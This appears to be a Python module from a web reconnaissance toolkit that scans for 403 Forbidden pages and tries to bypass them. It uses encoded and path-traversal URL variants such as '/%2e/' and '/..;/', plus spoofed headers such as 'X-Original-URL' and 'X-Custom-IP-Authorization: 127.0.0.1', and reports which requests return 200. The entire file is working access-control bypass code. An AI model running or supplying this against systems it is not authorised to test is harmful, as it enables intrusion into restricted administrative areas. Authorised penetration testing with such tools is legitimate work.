import asyncio
from modules.core import console

BYPASS_PAYLOADS = [
    "/%2e/", # /%2e/admin
    "/./",   # /./admin
    "/;/",   # /;/admin
    "/.;/",  # /.;/admin
    "//",    # //admin
    "/..;/", # /..;/admin
    "?query", # /admin?query
    "#",      # /admin#
    ".json"   # /admin.json
]

BYPASS_HEADERS = [
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Original-URL": "/admin"}, # Needs dynamic replacement
    {"X-Rewrite-URL": "/admin"},
    {"Client-IP": "127.0.0.1"}
]

async def check_bypass(session, url, original_path, payload, mode="path"):
    # Construct target URL
    if mode == "path":
        # Strategy: Insert payload before the last segment or modify the path
        # Simple strategy: /admin -> /%2e/admin
        if url.endswith("/"): url = url[:-1]
        
        # Split path to inject payload
        # e.g. http://site.com/admin -> http://site.com/%2e/admin
        parts = url.rsplit("/", 1)
        if len(parts) < 2: return None
        
        base = parts[0]
        endpoint = parts[1]
        
        target = f"{base}{payload}{endpoint}"
        headers = {}
        
    elif mode == "header":
        target = url
        headers = payload
    
    try:
        async with session.get(target, headers=headers, timeout=5, ssl=False, allow_redirects=False) as resp:
            # If we get a 200 OK or 302 (Redir) where previously it was 403
            if resp.status == 200:
                return {
                    "url": target,
                    "original": url,
                    "bypass_method": str(payload),
                    "status": "Bypassed (200 OK)"
                }
    except Exception:
        pass
    return None

async def scan_403_bypass(session, urls):
    """
    Scan for 403 Bypass on Forbidden pages.
    """
    console.print(f"\n[bold cyan]--- 403 Forbidden Bypass Scanner ---[/bold cyan]")
    
    # First, identify which URLs are actually 403
    forbidden_urls = []
    
    # Check first 20 for efficiency
    tasks = []
    for u in urls[:20]:
         tasks.append(session.get(u, timeout=3, ssl=False))
         
    try:
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        for i, resp in enumerate(responses):
            if not isinstance(resp, Exception) and resp.status == 403:
                forbidden_urls.append(urls[i])
    except Exception:
        pass

    if not forbidden_urls:
         console.print("[dim]No 403 Forbidden pages found to bypass.[/dim]")
         return []
         
    console.print(f"[yellow][!] Found {len(forbidden_urls)} Forbidden pages. Attempting bypass...[/yellow]")
    
    bypass_tasks = []
    for url in forbidden_urls:
        # Path Fuzzing
        for pay in BYPASS_PAYLOADS:
            bypass_tasks.append(check_bypass(session, url, "", pay, mode="path"))
            
        # Header Fuzzing
        for head in BYPASS_HEADERS:
             bypass_tasks.append(check_bypass(session, url, "", head, mode="header"))
             
    results = await asyncio.gather(*bypass_tasks)
    
    success = []
    for res in results:
        if res:
             console.print(f"  [bold red][!] 403 BYPASS SUCCESSFUL![/bold red]")
             console.print(f"      Target: {res['original']}")
             console.print(f"      Payload: {res['bypass_method']}")
             console.print(f"      Bypass URL: {res['url']}")
             success.append(res)
             
    if not success:
        console.print("[red][-] Bypass attempts failed.[/red]")
        
    return success
